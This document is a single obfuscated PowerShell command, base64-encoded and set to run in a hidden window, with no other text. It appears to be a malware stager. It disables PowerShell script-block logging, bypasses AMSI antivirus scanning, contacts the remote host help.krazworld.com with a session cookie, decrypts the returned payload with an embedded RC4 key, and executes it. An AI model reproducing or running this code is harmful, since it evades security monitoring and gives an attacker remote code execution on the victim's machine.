powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcARQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAGEATABVAGUAKAAkAE4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBsAD0AWwBDAG8AbABsAEUAQwBUAGkAbwBOAFMALgBHAGUATgBFAHIAaQBjAC4ARABJAGMAVABpAE8ATgBhAHIAWQBbAFMAVABSAEkAbgBHACwAUwBZAHMAVABFAG0ALgBPAEIASgBFAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAGUAewBbAFMAQwByAEkAcAB0AEIATABPAGMASwBdAC4AIgBHAEUAdABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBBAGwAVQBFACgAJABOAHUATABMACwAKABOAGUAdwAtAE8AQgBqAGUAQwB0ACAAQwBvAEwAbABFAGMAdABJAE8ATgBzAC4ARwBFAE4AZQBSAGkAQwAuAEgAQQBzAGgAUwBFAHQAWwBzAFQAcgBpAG4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATAB1AGUAKAAkAE4AdQBsAEwALAAkAHQAUgB1AEUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAG0ALgBOAGUAdAAuAFMARQByAFYASQBjAGUAUABvAEkAbgBUAE0AYQBOAEEARwBlAFIAXQA6ADoARQB4AFAARQBDAHQAMQAwADAAQwBPAE4AdABpAE4AVQBlAD0AMAA7ACQAVwBjAD0ATgBFAHcALQBPAGIAagBlAEMAdAAgAFMAeQBzAHQAZQBNAC4ATgBlAFQALgBXAEUAQgBDAGwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBBAEQARQBSAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBvAFgAeQA9AFsAUwB5AHMAVABlAE0ALgBOAGUAVAAuAFcARQBCAFIARQBxAFUAZQBzAFQAXQA6ADoARABFAEYAQQBVAGwAdABXAEUAYgBQAHIAbwB4AFkAOwAkAFcAYwAuAFAAUgBvAHgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAEwAcwAgAD0AIABbAFMAeQBTAFQARQBNAC4ATgBFAFQALgBDAHIAZQBEAGUATgBUAEkAQQBMAEMAQQBjAGgARQBdADoAOgBEAEUAZgBBAFUAbAB0AE4ARQBUAHcAbwBSAGsAQwByAEUARABlAG4AdABJAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABFAE0ALgBUAEUAeABUAC4ARQBuAGMAbwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQB0AGUAUwAoACcAZQA3ADEAYQAyADQAMQBhAGMAYgBhADYANAAwADQAMgAyADIAYgAwADMAZgA1AGEAMAAzADYAZQBjAGYAZgA3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AaABlAGwAcAAuAGsAcgBhAHoAaQB3AG8AcgBsAGQALgBjAG8AbQA6ADgAMAAnADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABXAGMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQA5AEkATwBRAGMAUwBkAFcAMwBVAHAAZwAxAHQASABPAHYANgB3ADkAcABhADQAdQA5AFQATQA9ACIAKQA7ACQARABBAHQAQQA9ACQAVwBDAC4ARABPAHcAbgBMAE8AYQBkAEQAQQBUAGEAKAAkAFMARQBSACsAJABUACkAOwAkAGkAdgA9ACQARABhAHQAQQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQAZABBAHQAQQBbADQALgAuACQAZABBAHQAQQAuAEwARQBuAEcAVABIAF0AOwAtAEoAbwBJAE4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
